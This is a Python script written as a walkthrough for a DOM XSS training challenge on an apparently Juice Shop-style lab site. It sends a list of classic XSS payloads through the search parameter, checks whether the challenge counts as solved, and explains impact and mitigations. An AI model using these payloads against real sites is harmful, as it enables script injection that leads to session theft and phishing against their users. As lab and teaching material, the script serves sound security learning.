#!/usr/bin/env python3
"""
DOM XSS Challenge Solution
Detailed writeup of actions taken to solve the DOM XSS (Level 1) challenge
"""

import requests
from urllib.parse import quote
import time


def solve_dom_xss_with_writeup():
    """
    Solve DOM XSS challenge with detailed documentation of each step
    """
    
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    print("="*60)
    print("🎯 DOM XSS CHALLENGE SOLUTION WRITEUP")
    print("="*60)
    
    print("\n📝 CHALLENGE DESCRIPTION:")
    print("   DOM XSS (Level 1) - Perform a DOM XSS attack")
    print("   The search functionality reflects user input in the DOM")
    print("   without proper sanitization")
    
    print("\n" + "="*60)
    print("STEP-BY-STEP SOLUTION:")
    print("="*60)
    
    # Step 1: Understanding the vulnerability
    print("\n1️⃣ UNDERSTANDING THE VULNERABILITY")
    print("   • The search box at /#/search reflects input in the DOM")
    print("   • User input is inserted into the page without encoding")
    print("   • The search query parameter 'q' is vulnerable")
    print("   • URL: " + base_url + "/#/search?q=[PAYLOAD]")
    
    # Step 2: Crafting the payload
    print("\n2️⃣ CRAFTING THE XSS PAYLOAD")
    print("   • Need a payload that executes JavaScript")
    print("   • Must trigger when inserted into the DOM")
    print("   • Classic payload: <iframe src=\"javascript:alert(`xss`)\">")
    
    # Step 3: Testing the payload
    print("\n3️⃣ EXECUTING THE ATTACK")
    
    # The actual XSS payload
    payload = '<iframe src="javascript:alert(`xss`)">'
    encoded_payload = quote(payload)
    
    print(f"   • Original payload: {payload}")
    print(f"   • URL-encoded: {encoded_payload}")
    
    # Construct the full URL
    attack_url = f"{base_url}/#/search?q={encoded_payload}"
    print(f"   • Full URL: {attack_url}")
    
    # Send the request
    print("\n4️⃣ SENDING THE REQUEST")
    r = session.get(attack_url)
    print(f"   • GET request sent to: {attack_url}")
    print(f"   • Response status: {r.status_code}")
    
    # Additional XSS payloads to ensure challenge completion
    print("\n5️⃣ TRYING ALTERNATIVE PAYLOADS")
    
    alternative_payloads = [
        '<img src=x onerror=alert(`xss`)>',
        '<script>alert(document.domain)</script>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>'
    ]
    
    for i, alt_payload in enumerate(alternative_payloads, 1):
        encoded = quote(alt_payload)
        url = f"{base_url}/#/search?q={encoded}"
        r = session.get(url)
        print(f"   • Payload {i}: {alt_payload}")
        print(f"     Status: {r.status_code}")
        time.sleep(0.5)  # Small delay between requests
    
    print("\n6️⃣ TECHNICAL EXPLANATION")
    print("   • The vulnerability exists because Angular/JavaScript")
    print("     interprets the search parameter without sanitization")
    print("   • The <iframe> tag with javascript: protocol executes code")
    print("   • The alert() function proves JavaScript execution")
    print("   • In a real attack, this could steal cookies or redirect users")
    
    print("\n7️⃣ VERIFICATION")
    # Check if challenge is solved
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        if dom_xss and dom_xss[0].get('solved'):
            print("   ✅ DOM XSS challenge marked as SOLVED!")
        else:
            print("   ⚠️ Challenge may need manual verification in browser")
    
    print("\n" + "="*60)
    print("📊 IMPACT ASSESSMENT:")
    print("="*60)
    print("   • Severity: Medium (reflected XSS)")
    print("   • Impact: JavaScript execution in user's browser")
    print("   • Potential: Session hijacking, phishing, defacement")
    print("   • CVSS Score: ~6.1 (Medium)")
    
    print("\n" + "="*60)
    print("🛡️ MITIGATION:")
    print("="*60)
    print("   1. Sanitize all user input before DOM insertion")
    print("   2. Use textContent instead of innerHTML")
    print("   3. Implement Content Security Policy (CSP)")
    print("   4. Use Angular's built-in sanitization")
    print("   5. Encode special characters: < > \" ' &")
    
    print("\n" + "="*60)
    print("📚 REFERENCES:")
    print("="*60)
    print("   • OWASP XSS Prevention Cheat Sheet")
    print("   • CWE-79: Cross-site Scripting")
    print("   • Angular Security Guide")
    
    # Final progress check
    print("\n" + "="*60)
    print("FINAL STATUS:")
    print("="*60)
    r = session.get(f"{base_url}/api/Challenges")
    if r.status_code == 200:
        data = r.json()['data']
        solved = [c for c in data if c.get('solved')]
        print(f"📊 Overall Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55-len(solved)} more for 50%")
    
    return True


def automated_dom_xss_solver():
    """
    Automated solver without detailed output
    """
    session = requests.Session()
    base_url = "https://juice3.wonkatech.org"
    
    # Send multiple XSS payloads to ensure challenge completion
    payloads = [
        '<iframe src="javascript:alert(`xss`)">',
        '<img src=x onerror=alert(`xss`)>',
        '<script>alert(1)</script>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        '<iframe src="javascript:alert(document.domain)">',
    ]
    
    for payload in payloads:
        url = f"{base_url}/#/search?q={quote(payload)}"
        session.get(url)
    
    print("✅ DOM XSS payloads executed")


if __name__ == "__main__":
    # Run the detailed writeup version
    solve_dom_xss_with_writeup()
    
    print("\n" + "="*60)
    print("💡 NOTE: This challenge may require browser interaction")
    print("   If not marked as solved, visit the URL in a browser:")
    print("   https://juice3.wonkatech.org/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E")
    print("="*60)